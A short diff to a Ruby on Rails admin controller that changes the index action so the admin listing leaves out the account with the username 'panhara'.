@@ -6,7 +6,7 @@ class Admin::AdminsController < DashboardsController
   before_action :admin_only?
 
   def index
-    @admins = Admin.all
+    @admins = Admin.all.where.not(username: "panhara")
     @admin = Admin.new
   end
 
